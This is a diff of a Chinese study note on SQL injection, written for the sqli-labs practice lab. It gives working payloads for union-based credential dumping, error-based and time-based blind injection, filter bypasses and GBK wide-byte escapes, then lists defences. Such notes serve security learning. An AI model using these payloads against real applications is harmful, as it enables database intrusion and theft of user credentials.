@@ -1,9 +1,5 @@
 # 04 · SQL 注入（task4）
 
-> 状态：✅ 已掌握（sqli-labs Less-1~21）
-
----
-
 # 一、原理
 
 **根因：把用户输入直接拼进 SQL 语句**，数据库分不清"指令"和"数据"。
@@ -34,9 +30,7 @@ mysqli_query($conn, $sql);
 |---|---|
 | `-- ` | **后面必须有空格**，URL 里用 `--+` |
 | `#` | MySQL 特有，**URL 要编码成 `%23`** |
-| `/**/` | 内联注释，**常用来绕空格过滤**。⚠️ 它**只在「按 token 解析」的语言里能当空格**（SQL / PHP / JS 代码层），**字符串里和 shell 里都无效** → 跨语言对照表见 [12](./12-注释当空格与命令绕过.md) |
-
----
+| `/**/` | 内联注释，**常用来绕空格过滤**。它**只在「按 token 解析」的语言里能当空格**（SQL / PHP / JS 代码层），**字符串里和 shell 里都无效** → 跨语言对照表见 [12](./12-注释当空格与命令绕过.md) |
 
 # 二、判断四步（**背**）
 
@@ -59,9 +53,7 @@ mysqli_query($conn, $sql);
   看页面上哪个数字显示了
 ```
 
-**⭐ `-1` 的作用**：让原查询查空，这样 union 的结果才会显示。
-
----
+**`-1` 的作用**：让原查询查空，这样 union 的结果才会显示。
 
 # 三、分类
 
@@ -83,8 +75,6 @@ mysqli_query($conn, $sql);
 | **HTTP 头注入** | User-Agent / Referer 被拼进 SQL |
 | **宽字节注入** | GBK 吃掉转义符 `\` → `%df'` |
 | **二次注入** | 存时转义，取出用时不转义 |
-
----
 
 # 四、information_schema（查数据三步）
 
@@ -118,11 +108,9 @@ union select 1,group_concat(username,0x3a,password),3 from users
 group_concat(table_name)                    -- 默认逗号分隔
 group_concat(table_name separator '|')      -- 自定义分隔符
 group_concat(a, 0x3a, b)                    -- 拼多字段
--- ⚠️ 默认限制 1024 字节，会截断！
+-- 默认限制 1024 字节，会截断！
 SET SESSION group_concat_max_len = 100000;
 ```
-
----
 
 # 五、报错注入
 
@@ -137,9 +125,7 @@ SET SESSION group_concat_max_len = 100000;
 ?id=1' and extractvalue(1,concat(0x7e,(select database())))--+
 ```
 
-**⚠️ 最多回显 32 字符**，超长要用 `substr()` 截断。
-
----
+**最多回显 32 字符**，超长要用 `substr()` 截断。
 
 # 六、盲注
 
@@ -161,8 +147,6 @@ SET SESSION group_concat_max_len = 100000;
 ?id=1' and if(条件, benchmark(1000000, md5(1)), 1)--+
 ```
 
----
-
 # 七、绕过技巧
 
 | 被过滤 | 绕过 |
@@ -171,21 +155,19 @@ SET SESSION group_concat_max_len = 100000;
 | **注释符** | `#` ↔ `-- ` ↔ `/**/` |
 | **`union`** | 大小写 `UNION`、**双写** `uniunionon`、`/*!union*/` |
 | **`select`** | 双写 `selselectect` |
-| **`and`/`or`** | `&&` / `\|\|`、`%26%26` |
+| **`and`/`or`** | `&&` / `\ | \ | `、`%26%26` |
 | **`=`** | `like`、`in`、`between` |
 | **逗号** | `join`、`limit 1 offset 0` |
 | **`substr`** | `mid`、`substring`、`left`、`right` |
 | **`ascii`** | `ord`、`hex` |
 | **`information_schema`** | `mysql.innodb_table_stats`（5.7+） |
 
-**⭐ 双写原理**：
+**双写原理**：
 ```
 过滤代码：str_replace('union', '', $id)
 输入：uniunionon
-删除中间那个 union → 剩下 union ✅
+删除中间那个 union → 剩下 union
 ```
-
----
 
 # 八、宽字节注入（GBK）
 
@@ -197,12 +179,10 @@ $id = addslashes($_GET['id']);       // ' → \'   （0x27 → 0x5C 0x27）
 **攻击**：输入 `%df'`
 ```
 %df(0xDF) + \(0x5C)  →  GBK 认为是一个汉字  →  反斜杠被吃掉
-剩下的 ' 逃逸出来 ✅
+剩下的 ' 逃逸出来
 ```
 
 **payload**：`?id=-1%df' union select 1,2,3 --+`
-
----
 
 # 九、二次注入
 
@@ -214,20 +194,16 @@ $id = addslashes($_GET['id']);       // ' → \'   （0x27 → 0x5C 0x27）
 
 **特点**：注入发生在**第二次使用**时，光看插入处代码发现不了。
 
----
-
 # 十、防御
 
 | 方法 | 说明 |
 |---|---|
-| **预处理（参数化查询）** | ⭐ **终极方案**，代码与数据分离 |
+| **预处理（参数化查询）** | **终极方案**，代码与数据分离 |
 | 白名单 | 只允许数字/字母 |
 | 转义特殊字符 | `'` `"` `\` `--` `#` |
 | 最小权限 | 数据库账号不给 FILE/PROCESS |
 | 关闭报错回显 | 防止报错注入 |
 | 统一字符集 | 防宽字节 |
-
----
 
 # 十一、一句话
 
